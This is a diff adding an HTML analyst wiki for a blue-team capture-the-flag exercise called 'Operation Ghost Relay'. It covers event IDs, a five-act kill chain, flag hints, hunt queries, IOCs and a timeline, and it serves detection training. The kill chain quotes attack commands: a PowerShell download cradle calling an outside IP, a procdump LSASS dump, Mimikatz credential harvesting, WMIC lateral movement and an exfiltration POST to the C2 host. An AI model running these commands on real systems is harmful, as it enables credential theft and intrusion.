+      <div class="eid-name">Network Connection</div>
+      <div class="eid-desc">Logs every outbound TCP/UDP connection initiated by a process. Contains source and destination IP/port. Use to find C2 beaconing patterns — look for regular intervals, unusual ports, or connections to non-corporate IPs.</div>
+      <div class="eid-fields">Key fields: Image, DestinationIp, DestinationPort, Protocol</div>
+    </div>
+    <div class="eid-card" style="border-top-color:#ef4444">
+      <div class="eid-num" style="color:#ef4444">10</div>
+      <div class="eid-name">Process Access</div>
+      <div class="eid-desc">Logged when one process opens a handle to another process. Critical for detecting credential dumping — <code>lsass.exe</code> being accessed with <code>0x1FFFFF</code> (PROCESS_ALL_ACCESS) is a near-certain credential dump indicator.</div>
+      <div class="eid-fields">Key fields: SourceImage, TargetImage, GrantedAccess, CallTrace</div>
+    </div>
+    <div class="eid-card" style="border-top-color:#8b5cf6">
+      <div class="eid-num" style="color:#8b5cf6">11</div>
+      <div class="eid-name">File Created</div>
+      <div class="eid-desc">Logged when a file is created or overwritten. Use to track staging — attackers typically drop tools to <code>C:\Windows\Temp\</code> or <code>C:\Users\...\AppData\</code>. Also catches credential dump output files.</div>
+      <div class="eid-fields">Key fields: Image, TargetFilename, User</div>
+    </div>
+    <div class="eid-card" style="border-top-color:#06b6d4">
+      <div class="eid-num" style="color:#06b6d4">22</div>
+      <div class="eid-name">DNS Query</div>
+      <div class="eid-desc">Logs every DNS query and its result. Use to identify DGA (Domain Generation Algorithm) domains — they look random, are short-lived, and often return NXDOMAIN or C2 IPs. Compare against known-good domain lists.</div>
+      <div class="eid-fields">Key fields: QueryName, QueryResults, Image</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ WINDOWS EIDS -->
+<section id="windows-eids">
+  <h2>Windows Security Event IDs</h2>
+
+  <div class="eid-grid">
+    <div class="eid-card" style="border-top-color:#10b981">
+      <div class="eid-num" style="color:#10b981">4624</div>
+      <div class="eid-name">An account was successfully logged on</div>
+      <div class="eid-desc">Generated for every successful logon. The <strong>LogonType</strong> field is critical: Type 2 = interactive (keyboard), Type 3 = network (remote share, RPC), Type 10 = remote interactive (RDP). Lateral movement typically produces Type 3.</div>
+      <div class="eid-fields">Key fields: TargetUserName, LogonType, IpAddress, AuthenticationPackage</div>
+    </div>
+    <div class="eid-card" style="border-top-color:#f97316">
+      <div class="eid-num" style="color:#f97316">4648</div>
+      <div class="eid-name">Logon attempt with explicit credentials</div>
+      <div class="eid-desc">Logged when a process attempts to log on using different credentials (e.g. <code>runas</code>, PsExec with <code>-u</code>, WMIC with <code>/user:</code>). A strong lateral movement indicator, especially when the source process is <code>wmic.exe</code> or <code>psexec.exe</code>.</div>
+      <div class="eid-fields">Key fields: SubjectUserName, TargetUserName, TargetServerName, ProcessName</div>
+    </div>
+    <div class="eid-card" style="border-top-color:#eab308">
+      <div class="eid-num" style="color:#eab308">4688</div>
+      <div class="eid-name">A new process has been created (Windows Security)</div>
+      <div class="eid-desc">The built-in Windows equivalent of Sysmon EID 1. Less detailed (no file hash, less reliable command line) but present on systems without Sysmon. In this dataset it provides redundant confirmation of attacker activity. Cross-reference with EID 1 for the same timestamp.</div>
+      <div class="eid-fields">Key fields: NewProcessName, CommandLine, ParentProcessName, SubjectUserName</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ SYSTEM EIDS -->
+<section id="system-eids">
+  <h2>System Event IDs</h2>
+
+  <div class="eid-grid">
+    <div class="eid-card" style="border-top-color:#ec4899">
+      <div class="eid-num" style="color:#ec4899">7045</div>
+      <div class="eid-name">A new service was installed</div>
+      <div class="eid-desc">Logged in the System channel when a new Windows service is installed. PsExec installs a service called <strong>PSEXESVC</strong> on the target machine when it runs. This is logged on <code>WORKSTATION-07</code> — confirming successful lateral movement. The <code>ServiceName</code> and <code>ImagePath</code> fields tell you what was installed.</div>
+      <div class="eid-fields">Key fields: ServiceName, ImagePath, ServiceType, AccountName</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ KILL CHAIN -->
+<section id="kill-chain">
+  <h2>Kill Chain</h2>
+  <p>The attack follows the MITRE ATT&CK framework across 5 acts. Each act has specific IOCs and corresponding flags.</p>
+
+  <div class="kc-steps">
+
+    <div class="kc-step">
+      <div class="kc-num" style="color:#f59e0b;border-color:#f59e0b;background:#2b1500">1</div>
+      <div class="kc-body">
+        <div class="kc-title">Initial Access — Spear Phishing</div>
+        <div class="kc-meta">2024-03-11 ~09:14 UTC · WORKSTATION-03 · jmendoza</div>
+        <ul>
+          <li><code>jmendoza</code> opens <code>Q1_Budget_Review_FINAL.docm</code> from Downloads</li>
+          <li>Word macro executes — <code>WINWORD.EXE</code> spawns <code>cmd.exe</code> (Sysmon EID 1)</li>
+          <li>cmd spawns PowerShell with Base64-encoded payload (<code>-Enc</code> flag)</li>
+          <li>Encoded payload: <code>IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage1')</code></li>
+        </ul>
+        <div class="callout success" style="margin-top:10px;padding:10px 14px">
+          <div class="callout-icon">🏴</div>
+          <div class="callout-body"><strong>FLAG 1</strong> is embedded in the <code>CommandLine</code> of the cmd.exe spawned by WINWORD. Query: <code>parent CONTAINS "WINWORD" AND eid = "1"</code></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="kc-step">
+      <div class="kc-num" style="color:#f97316;border-color:#f97316;background:#2b1200">2</div>
+      <div class="kc-body">
+        <div class="kc-title">Discovery — Domain Enumeration</div>
+        <div class="kc-meta">2024-03-11 09:16–09:22 UTC · WORKSTATION-03 · jmendoza</div>
+        <ul>
+          <li>11 discovery commands run in rapid succession from the PS session</li>
+          <li><code>whoami /all</code>, <code>net user jmendoza /domain</code>, <code>net localgroup administrators</code></li>
+          <li><code>net group "Domain Admins" /domain</code>, <code>ipconfig /all</code>, <code>systeminfo</code></li>
+          <li><code>net view /domain</code>, <code>arp -a</code>, <code>nltest /domain_trusts</code></li>
+          <li>All spawned as children of PowerShell — look for the burst of EID 1 events</li>
+          <li>A text file is dropped to AppData\Temp containing FLAG 2</li>
+        </ul>
+        <div class="callout success" style="margin-top:10px;padding:10px 14px">
+          <div class="callout-icon">🏴</div>
+          <div class="callout-body"><strong>FLAG 2</strong> is in a <code>TargetFilename</code> on Sysmon EID 11. Query: <code>eid = "11" AND file CONTAINS "AppData" AND user CONTAINS "jmendoza"</code></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="kc-step">
+      <div class="kc-num" style="color:#ec4899;border-color:#ec4899;background:#2b001a">3</div>
+      <div class="kc-body">
+        <div class="kc-title">Lateral Movement — WMIC + PsExec</div>
+        <div class="kc-meta">2024-03-11 17:52 UTC · WORKSTATION-03 → WORKSTATION-07</div>
+        <ul>
+          <li>WMIC remote execution: <code>wmic /node:WORKSTATION-07 /user:CORP\jmendoza process call create</code></li>
+          <li>Windows 4648 (explicit cred logon) then 4624 (Type 3 network logon) on WORKSTATION-07</li>
+          <li>PsExec64 dropped to <code>C:\Windows\Temp\psexec64.exe</code> (EID 11)</li>
+          <li>PsExec executed against WORKSTATION-07 with explicit credentials</li>
+          <li>PSEXESVC service installed on WORKSTATION-07 (Windows EID 7045)</li>
+          <li>Post-pivot discovery: <code>whoami</code>, <code>net localgroup</code>, <code>dir C:\Users</code> on WORKSTATION-07</li>
+        </ul>
+        <div class="callout success" style="margin-top:10px;padding:10px 14px">
+          <div class="callout-icon">🏴</div>
+          <div class="callout-body"><strong>FLAG 3</strong> is in the PsExec command line. Query: <code>cmdline CONTAINS "psexec" AND eid = "1"</code></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="kc-step">
+      <div class="kc-num" style="color:#ef4444;border-color:#ef4444;background:#2b0000">4</div>
+      <div class="kc-body">
+        <div class="kc-title">Credential Harvesting — LSASS Dump</div>
+        <div class="kc-meta">2024-03-12 02:17 UTC · WORKSTATION-03 · jmendoza</div>
+        <ul>
+          <li>Attacker operates at 2 AM to avoid detection</li>
+          <li><code>pd.exe</code> (procdump) dropped to <code>C:\Windows\Temp\</code></li>
+          <li>Executed: <code>pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp</code></li>
+          <li>Sysmon EID 10: <code>pd.exe</code> accesses <code>lsass.exe</code> with <code>GrantedAccess=0x1FFFFF</code></li>
+          <li><code>lsass.dmp</code> file created (EID 11)</li>
+          <li>Mimikatz-renamed as <code>svchost32.exe</code> executes <code>sekurlsa::logonpasswords</code></li>
+          <li>FLAG 4 file dropped to Temp by svchost32.exe</li>
+        </ul>
+        <div class="callout success" style="margin-top:10px;padding:10px 14px">
+          <div class="callout-icon">🏴</div>
+          <div class="callout-body"><strong>FLAG 4</strong> is in a file created by <code>svchost32.exe</code>. Query: <code>eid = "11" AND image CONTAINS "svchost32"</code></div>
+        </div>
+        <div class="callout danger" style="margin-top:8px;padding:10px 14px">
+          <div class="callout-icon">🔴</div>
+          <div class="callout-body"><strong>Red herring:</strong> Windows Defender's MsMpEng.exe also accesses lsass.exe legitimately — check the <code>SourceImage</code> to confirm it's <code>pd.exe</code>, not a security product.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="kc-step">
+      <div class="kc-num" style="color:#8b5cf6;border-color:#8b5cf6;background:#1a0030">5</div>
+      <div class="kc-body">
+        <div class="kc-title">C2 Beaconing &amp; Exfiltration</div>
+        <div class="kc-meta">2024-03-12 03:01 → 2024-03-12 22:45 UTC · WORKSTATION-03</div>
+        <ul>
+          <li>PowerShell beacons to <code>185.220.101.47:443</code> every ~10 minutes (28 connections)</li>
+          <li>DGA DNS queries from PowerShell: <code>xk3r9v2malpq.net</code>, <code>p9n2xv4qrst7.ru</code>, etc. — NXDOMAIN except primary C2</li>
+          <li>7-Zip compresses <code>C:\Users\jmendoza\Documents\</code> + <code>lsass.dmp</code> to <code>archive.zip</code></li>
+          <li><code>Invoke-WebRequest -Method POST</code> exfiltrates <code>archive.zip</code> to C2 — FLAG 5 in URL</li>
+          <li>Attacker deletes all staged files: <code>pd.exe</code>, <code>lsass.dmp</code>, <code>svchost32.exe</code>, <code>archive.zip</code></li>
+        </ul>
+        <div class="callout success" style="margin-top:10px;padding:10px 14px">
+          <div class="callout-icon">🏴</div>
+          <div class="callout-body"><strong>FLAG 5</strong> is in the Invoke-WebRequest command line URL. Query: <code>cmdline CONTAINS "POST" AND eid = "1"</code></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ RABBIT HOLES -->
+<section id="rabbit-holes">
+  <h2>Rabbit Holes ⚠️</h2>
+  <p>These are events that look alarming but are <strong>completely benign</strong>. They're designed to waste your time if you don't correlate properly.</p>
+
+  <div class="callout danger">
+    <div class="callout-icon">🕳️</div>
+    <div class="callout-body"><strong>Key rule:</strong> Always check the <em>combination</em> of host + user + parent process + time. An admin running <code>net user</code> on SRV-DC01 at 2 PM is normal. <code>jmendoza</code> running it on WORKSTATION-03 spawned by PowerShell at 9 AM is not.</div>
+  </div>
+
+  <table class="qtable" style="margin-top:16px">
+    <tr><th>Suspicious Event</th><th>Why It's Actually Benign</th></tr>
+    <tr>
+      <td>reg.exe spawned by svchost.exe</td>
+      <td>Windows scheduled tasks run reg.exe regularly to update run keys. Source is SYSTEM, not a user. Query: <code>image CONTAINS "reg.exe" AND user = "SYSTEM"</code></td>
+    </tr>
+    <tr>
+      <td>PowerShell from svchost.exe</td>
+      <td>Windows Update legitimately spawns PS from svchost. Check the command line — if it contains <code>PSWindowsUpdate</code> or <code>NonInteractive</code> without encoded content, it's WU.</td>
+    </tr>
+    <tr>
+      <td>rthomas running wmic on SRV-DC01</td>
+      <td>Domain admin doing inventory. WMIC without <code>/node:</code> pointing at a workstation is normal admin activity.</td>
+    </tr>
+    <tr>
+      <td>asmith running reg/schtasks/netstat</td>
+      <td>Power user doing legitimate sys admin work. The user, host, and timing don't match the attacker profile.</td>
+    </tr>
+    <tr>
+      <td>xcopy creating files on SRV-FILE01</td>
+      <td>asmith copying Q1 report files legitimately. EID 11 on SRV-FILE01 with asmith is expected file server activity.</td>
+    </tr>
+    <tr>
+      <td>PowerShell on WORKSTATION-12</td>
+      <td>Completely different host. The attacker only operates on WORKSTATION-03 and WORKSTATION-07.</td>
+    </tr>
+    <tr>
+      <td>Chrome / Edge network connections</td>
+      <td>Normal browsing traffic to Google, Microsoft, CDNs. Hundreds of benign connections.</td>
+    </tr>
+    <tr>
+      <td>DNS to Microsoft/Google domains</td>
+      <td>Windows Update, telemetry, browser activity. Only the DGA-looking domains from WORKSTATION-03 are malicious.</td>
+    </tr>
+    <tr>
+      <td>Multiple failed/successful logons</td>
+      <td>Normal corporate activity. Focus on jmendoza logon type 3 events on WORKSTATION-07 specifically.</td>
+    </tr>
+  </table>
+</section>
+
+<!-- ═══════════════════════════════════════════════ FLAGS -->
+<section id="flags">
+  <h2>Flags &amp; Hints</h2>
+  <p>There are 5 flags hidden in the log data. Each flag is in <code>CTF{...}</code> format and embedded in a real event field. The SIEM auto-detects flags when you find events containing them.</p>
+
+  <div class="flag-grid">
+    <div class="flag-card">
+      <div class="flag-id">🏴 FLAG 1</div>
+      <div class="flag-act">Act 1 · Initial Access</div>
+      <p style="font-size:12.5px;color:var(--text2)">The first flag is in the command line of the process that proves the macro executed and spawned a shell.</p>
+      <div class="flag-hint">💡 Look for a cmd.exe whose parent is a Microsoft Office application. Check the full CommandLine field in the detail panel.</div>
+      <div class="flag-query">parent CONTAINS "WINWORD" AND eid = "1"</div>
+    </div>
+    <div class="flag-card">
+      <div class="flag-id">🏴 FLAG 2</div>
+      <div class="flag-act">Act 2 · Discovery</div>
+      <p style="font-size:12.5px;color:var(--text2)">The attacker's script wrote a file to the temp directory. The filename itself contains the flag.</p>
+      <div class="flag-hint">💡 Search EID 11 for files created by jmendoza. Look in AppData\Local\Temp for an unusual .txt filename.</div>
+      <div class="flag-query">eid = "11" AND user CONTAINS "jmendoza" AND file CONTAINS "AppData"</div>
+    </div>
+    <div class="flag-card">
+      <div class="flag-id">🏴 FLAG 3</div>
+      <div class="flag-act">Act 3 · Lateral Movement</div>
+      <p style="font-size:12.5px;color:var(--text2)">The attacker ran PsExec against the pivot host. The echo command in the PsExec command line contains the flag.</p>
+      <div class="flag-hint">💡 Find the psexec64.exe process creation event. Read the full CommandLine — it includes an echo statement.</div>
+      <div class="flag-query">image CONTAINS "psexec" AND eid = "1"</div>
+    </div>
+    <div class="flag-card">
+      <div class="flag-id">🏴 FLAG 4</div>
+      <div class="flag-act">Act 4 · Credential Harvesting</div>
+      <p style="font-size:12.5px;color:var(--text2)">The renamed Mimikatz binary dropped a results file. The filename of that output file is the flag.</p>
+      <div class="flag-hint">💡 Find EID 11 events from svchost32.exe. That binary is mimikatz renamed — it dropped a .txt file with the flag in the filename.</div>
+      <div class="flag-query">eid = "11" AND image CONTAINS "svchost32"</div>
+    </div>
+    <div class="flag-card" style="grid-column:1/-1">
+      <div class="flag-id">🏴 FLAG 5</div>
+      <div class="flag-act">Act 5 · Exfiltration</div>
+      <p style="font-size:12.5px;color:var(--text2)">The final exfiltration command — an Invoke-WebRequest POST — has the flag embedded in the URL path.</p>
+      <div class="flag-hint">💡 Find the PowerShell process with Invoke-WebRequest and -Method POST in the command line. The URL contains the flag. This is also the event that proves data left the network.</div>
+      <div class="flag-query">cmdline CONTAINS "POST" AND eid = "1" AND user CONTAINS "jmendoza"</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════ PLAYBOOK -->
+<section id="playbook">
+  <h2>Hunt Playbook</h2>
+  <p>Recommended investigation order for a first-time analyst. Follow these steps to reconstruct the full timeline.</p>
+
+  <h3>Phase 1 — Triage (5 min)</h3>
+  <ol>
+    <li>Load logs, check <strong>Stats</strong> tab — identify outlier hosts/users by event count</li>
+    <li>Check <strong>Timeline</strong> tab — look for spikes in activity (attack bursts)</li>
+    <li>Run free-text search: <code>jmendoza</code> — confirm the compromised account</li>
+    <li>Click <strong>WORKSTATION-03</strong> in the sidebar to filter to the primary attacker host</li>
+  </ol>
+
+  <h3>Phase 2 — Initial Access (10 min)</h3>
+  <ol>
+    <li>Run preset <strong>⚡ WINWORD spawns cmd</strong></li>
+    <li>Find the EID 1 event with WINWORD as parent — click it to expand detail</li>
+    <li>Note the timestamp (~09:14 on Day 1) — this anchors your timeline</li>
+    <li>Run <code>cmdline CONTAINS "-Enc"</code> — identify the encoded PS payload</li>
+    <li>Decode the Base64 payload to confirm staging URL (it calls back to 185.220.101.47)</li>
+  </ol>
+
+  <h3>Phase 3 — Discovery (10 min)</h3>
+  <ol>
+    <li>Run preset <strong>🕵️ Discovery Commands</strong></li>
+    <li>Sort results by Time — confirm rapid-fire execution (all within 7 minutes)</li>
+    <li>Note all discovery commands are children of powershell.exe — consistent with in-memory execution</li>
+    <li>Run <code>eid = "11" AND user CONTAINS "jmendoza" AND file CONTAINS "AppData"</code> for FLAG 2</li>
+  </ol>
+
+  <h3>Phase 4 — Lateral Movement (15 min)</h3>
+  <ol>
+    <li>Run <code>cmdline CONTAINS "wmic" AND cmdline CONTAINS "/node:"</code></li>
+    <li>Confirm the WMIC command targets WORKSTATION-07</li>
+    <li>Check EID 4648 and 4624 for WORKSTATION-07 around the same timestamp</li>
+    <li>Run <code>eid = "11" AND file CONTAINS "psexec"</code> — find the drop event</li>
+    <li>Run <code>image CONTAINS "psexec"</code> — find execution + FLAG 3</li>
+    <li>Verify EID 7045 on WORKSTATION-07 confirms PSEXESVC service install</li>
+  </ol>
+
+  <h3>Phase 5 — Credential Harvesting (10 min)</h3>
+  <ol>
+    <li>Run preset <strong>💀 LSASS Accessed BY</strong> — find EID 10</li>
+    <li>Confirm GrantedAccess = <code>0x1FFFFF</code> (PROCESS_ALL_ACCESS — definitive dump)</li>
+    <li>Run <code>file ENDSWITH ".dmp"</code> to confirm lsass.dmp creation</li>
+    <li>Run <code>image CONTAINS "svchost32"</code> — find the renamed Mimikatz + FLAG 4</li>
+    <li>Cross-reference hash against known Mimikatz MD5: <code>4DD07D953DE0C7F1D6E5A5DB3D9CF9B4</code></li>
+  </ol>
+
+  <h3>Phase 6 — C2 &amp; Exfil (10 min)</h3>
+  <ol>
+    <li>Run preset <strong>🌐 C2 Beacon</strong> — view the 28 connections to 185.220.101.47</li>
+    <li>Switch to <strong>Timeline</strong> tab — see the regular ~10-min beacon interval on Day 2</li>
+    <li>Run <code>eid = "22" AND host = "WORKSTATION-03"</code> — find DGA DNS queries</li>
+    <li>Run <code>image CONTAINS "7z.exe"</code> — find compression event (what was zipped?)</li>
+    <li>Run preset <strong>📤 Exfil POST</strong> — find Invoke-WebRequest + FLAG 5</li>
+    <li>Run preset <strong>🧹 Attacker Cleanup</strong> — confirm which files were deleted</li>
+  </ol>
+</section>
+
+<!-- ═══════════════════════════════════════════════ IOC -->
+<section id="ioc">
+  <h2>IOC List</h2>
+  <p>Indicators of Compromise for Operation Ghost Relay. Use these to pivot your investigation.</p>
+
+  <h3>Network IOCs</h3>
+  <table class="ftable">
+    <tr><th>Indicator</th><th>Type</th><th>Notes</th></tr>
+    <tr><td>185.220.101.47</td><td style="color:var(--red)">C2 IP</td><td>Known Tor exit node. 28 beacons on port 443. PowerShell source.</td></tr>
+    <tr><td>xk3r9v2malpq.net</td><td style="color:var(--red)">C2 Domain</td><td>Primary DGA domain. Resolves to C2 IP.</td></tr>
+    <tr><td>p9n2xv4qrst7.ru</td><td style="color:var(--orange)">DGA Domain</td><td>NXDOMAIN. Part of DGA rotation.</td></tr>
+    <tr><td>m3k8lw2bvxyz.top</td><td style="color:var(--orange)">DGA Domain</td><td>NXDOMAIN. Part of DGA rotation.</td></tr>
+    <tr><td>j7t4qs9zyabv.cc</td><td style="color:var(--orange)">DGA Domain</td><td>NXDOMAIN. Part of DGA rotation.</td></tr>
+    <tr><td>n2p6rv3wkqml.xyz</td><td style="color:var(--orange)">DGA Domain</td><td>NXDOMAIN. Part of DGA rotation.</td></tr>
+    <tr><td>:443 (HTTPS)</td><td style="color:var(--yellow)">Port</td><td>C2 traffic blended into HTTPS. No TLS inspection = blind spot.</td></tr>
+  </table>
+
+  <h3>Host IOCs</h3>
+  <table class="ftable">
+    <tr><th>Indicator</th><th>Type</th><th>Notes</th></tr>
+    <tr><td>C:\Windows\Temp\psexec64.exe</td><td style="color:var(--red)">Dropped Tool</td><td>PsExec binary. EID 11 then EID 1.</td></tr>
+    <tr><td>C:\Windows\Temp\pd.exe</td><td style="color:var(--red)">Dropped Tool</td><td>Procdump renamed. Used to dump lsass.</td></tr>
+    <tr><td>C:\Windows\Temp\svchost32.exe</td><td style="color:var(--red)">Dropped Tool</td><td>Mimikatz renamed to blend in. MD5: 4DD07D953DE0C7F1D6E5A5DB3D9CF9B4</td></tr>
+    <tr><td>C:\Windows\Temp\lsass.dmp</td><td style="color:var(--red)">Credential Dump</td><td>LSASS memory dump. Contains credential hashes.</td></tr>
+    <tr><td>C:\Windows\Temp\archive.zip</td><td style="color:var(--red)">Exfil Staging</td><td>Compressed exfil package. Deleted post-exfil.</td></tr>
+    <tr><td>Q1_Budget_Review_FINAL.docm</td><td style="color:var(--orange)">Phishing Doc</td><td>Macro-enabled Word doc. Initial access vector.</td></tr>
+    <tr><td>PSEXESVC</td><td style="color:var(--orange)">Service</td><td>PsExec service on WORKSTATION-07. EID 7045.</td></tr>
+    <tr><td>4DD07D953DE0C7F1D6E5A5DB3D9CF9B4</td><td style="color:var(--red)">MD5 Hash</td><td>Mimikatz binary (svchost32.exe)</td></tr>
+  </table>
+
+  <h3>Behavioral IOCs</h3>
+  <table class="ftable">
+    <tr><th>Behavior</th><th>MITRE ATT&CK</th><th>Evidence</th></tr>
+    <tr><td>Office app spawning cmd/PowerShell</td><td>T1566.001</td><td>EID 1: WINWORD → cmd → powershell</td></tr>
+    <tr><td>Base64 encoded PowerShell</td><td>T1027</td><td>EID 1: cmdline contains -Enc</td></tr>
+    <tr><td>WMIC remote execution</td><td>T1047</td><td>EID 1: wmic /node: process call create</td></tr>
+    <tr><td>PsExec lateral movement</td><td>T1021.002</td><td>EID 1, 11, 4648, 7045</td></tr>
+    <tr><td>LSASS memory access</td><td>T1003.001</td><td>EID 10: GrantedAccess 0x1FFFFF</td></tr>
+    <tr><td>DGA domain queries</td><td>T1568.002</td><td>EID 22: random-looking domains from PS</td></tr>
+    <tr><td>HTTPS C2 beaconing</td><td>T1071.001</td><td>EID 3: PS → 185.220.101.47:443 ×28</td></tr>
+    <tr><td>Archive &amp; exfil</td><td>T1560.001 + T1041</td><td>EID 1: 7z.exe + Invoke-WebRequest POST</td></tr>
+    <tr><td>Indicator removal (cleanup)</td><td>T1070.004</td><td>EID 1: cmd /c del /f /q on dropped files</td></tr>
+  </table>
+</section>
+
+<!-- ═══════════════════════════════════════════════ TIMELINE -->
+<section id="timeline">
+  <h2>Event Timeline</h2>
+  <p>Chronological reference of attacker activity. Use the SIEM Timeline tab for a visual view.</p>
+
+  <table class="qtable">
+    <tr><th>Timestamp (UTC)</th><th>Event</th><th>EID</th></tr>
+    <tr><td>2024-03-11 09:14:33</td><td>jmendoza opens Q1_Budget_Review_FINAL.docm</td><td>EID 1</td></tr>
+    <tr><td>2024-03-11 09:15:20</td><td>WINWORD.EXE spawns cmd.exe (macro fires) — FLAG 1</td><td>EID 1</td></tr>
+    <tr><td>2024-03-11 09:15:23</td><td>cmd.exe spawns PowerShell with -Enc payload</td><td>EID 1</td></tr>
+    <tr><td>2024-03-11 09:16:53</td><td>Discovery begins: whoami, net user, net localgroup...</td><td>EID 1 ×11</td></tr>
+    <tr><td>2024-03-11 09:23:10</td><td>FLAG 2 text file dropped to AppData\Temp</td><td>EID 11</td></tr>
+    <tr><td>2024-03-11 17:52:11</td><td>WMIC remote execution on WORKSTATION-07</td><td>EID 1</td></tr>
+    <tr><td>2024-03-11 17:52:13</td><td>Explicit credential logon (4648) → network logon on WS-07 (4624)</td><td>EID 4648, 4624</td></tr>
+    <tr><td>2024-03-11 17:55:09</td><td>psexec64.exe dropped to C:\Windows\Temp\</td><td>EID 11</td></tr>
+    <tr><td>2024-03-11 17:55:31</td><td>PsExec runs against WORKSTATION-07 — FLAG 3</td><td>EID 1</td></tr>
+    <tr><td>2024-03-11 17:55:36</td><td>PSEXESVC service installed on WORKSTATION-07</td><td>EID 7045</td></tr>
+    <tr><td>2024-03-12 02:17:44</td><td>pd.exe (procdump) dropped to Temp</td><td>EID 11</td></tr>
+    <tr><td>2024-03-12 02:18:02</td><td>pd.exe executes against lsass.exe</td><td>EID 1</td></tr>
+    <tr><td>2024-03-12 02:18:04</td><td>lsass.exe accessed with 0x1FFFFF (PROCESS_ALL_ACCESS)</td><td>EID 10</td></tr>
+    <tr><td>2024-03-12 02:18:12</td><td>lsass.dmp created</td><td>EID 11</td></tr>
+    <tr><td>2024-03-12 02:21:44</td><td>svchost32.exe (Mimikatz) executes sekurlsa::logonpasswords</td><td>EID 1</td></tr>
+    <tr><td>2024-03-12 02:21:49</td><td>FLAG 4 .txt file created by svchost32.exe</td><td>EID 11</td></tr>
+    <tr><td>2024-03-12 03:01:00</td><td>C2 beaconing begins — PS → 185.220.101.47:443</td><td>EID 3 ×28</td></tr>
+    <tr><td>2024-03-12 03:00→17:00</td><td>DGA DNS queries (xk3r9v2malpq.net + 5 others)</td><td>EID 22 ×36</td></tr>
+    <tr><td>2024-03-12 22:32:40</td><td>7-Zip compresses Documents + lsass.dmp → archive.zip</td><td>EID 1</td></tr>
+    <tr><td>2024-03-12 22:33:10</td><td>archive.zip staged in Temp</td><td>EID 11</td></tr>
+    <tr><td>2024-03-12 22:35:10</td><td>Invoke-WebRequest POST to C2 — FLAG 5</td><td>EID 1</td></tr>
+    <tr><td>2024-03-12 22:35:13</td><td>Final network connection to 185.220.101.47:443</td><td>EID 3</td></tr>
+    <tr><td>2024-03-12 22:45:xx</td><td>Attacker deletes all Temp artifacts (4 del commands)</td><td>EID 1 ×4</td></tr>
+  </table>
+</section>
+
+<!-- ═══════════════════════════════════════════════ FAQ -->
+<section id="faq">
+  <h2>FAQ</h2>
+
+  <h3>Why can't I find any events?</h3>
+  <p>Make sure the log file is loaded (the header shows event count). If you're getting 0 results on a query, check your field name spelling and try removing conditions one at a time to narrow it down.</p>
+
+  <h3>My query returns too many results</h3>
+  <p>Add more AND conditions to narrow scope. Always add <code>host = "WORKSTATION-03"</code> or <code>user CONTAINS "jmendoza"</code> when hunting attacker activity — most events on other hosts are benign noise.</p>
+
+  <h3>What's the difference between EID 1 and EID 4688?</h3>
+  <p>Both log process creation. EID 1 is Sysmon (richer data — file hashes, full parent info, ProcessGuid for correlation). EID 4688 is the built-in Windows Security audit (less detail, no hashes). When both exist for the same event, EID 1 is more reliable.</p>
+
+  <h3>How do I decode the Base64 PowerShell?</h3>
+  <p>Copy the Base64 string after <code>-Enc</code> and decode it as UTF-16LE (Windows uses UTF-16 for PS -EncodedCommand). In CyberChef: use <strong>From Base64</strong> then <strong>Decode text</strong> with UTF-16LE encoding. The decoded command shows the IEX download cradle.</p>
+
+  <h3>The flag detector in the header doesn't update</h3>
+  <p>The flag tracker detects flags that appear in event rows visible in the current filtered results. Run a query that returns the flag-containing event, then click the row — the flag header will update. Run <strong>🏴 All Flags</strong> preset to find all five at once.</p>
+
+  <h3>What does GrantedAccess 0x1FFFFF mean?</h3>
+  <p>It's the Windows access mask for <code>PROCESS_ALL_ACCESS</code> — the highest possible access level to a process. When a non-system process (like pd.exe) requests this access to lsass.exe, it's almost always a credential dump attempt. Legitimate access to lsass uses much more restricted masks.</p>
+
+  <h3>How do I confirm lateral movement actually succeeded?</h3>
+  <p>Look for the combination of: (1) EID 4648 from the source host showing explicit credentials used, then (2) EID 4624 LogonType 3 on the <em>target</em> host from the attacker's source IP shortly after. Then (3) EID 7045 on the target confirming PSEXESVC installed. All three together = confirmed successful lateral movement.</p>
+</section>
+
+<div style="margin-top:60px;padding-top:24px;border-top:1px solid var(--border);color:var(--text3);font-size:12px;font-family:'JetBrains Mono',monospace;text-align:center">
+  Operation Ghost Relay · CTF Edition · Analyst Wiki v1.0 · 5 flags · Good luck
+</div>
+
+</main>
+
+<script>
+// Highlight active nav link on scroll
+const sections = document.querySelectorAll('section[id]');
+const navLinks = document.querySelectorAll('.nav-link');
+const obs = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(l => l.classList.remove('active'));
+      const active = document.querySelector(`.nav-link[href="#${e.target.id}"]`);
+      if (active) active.classList.add('active');
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => obs.observe(s));
+</script>
+</body>
+</html>
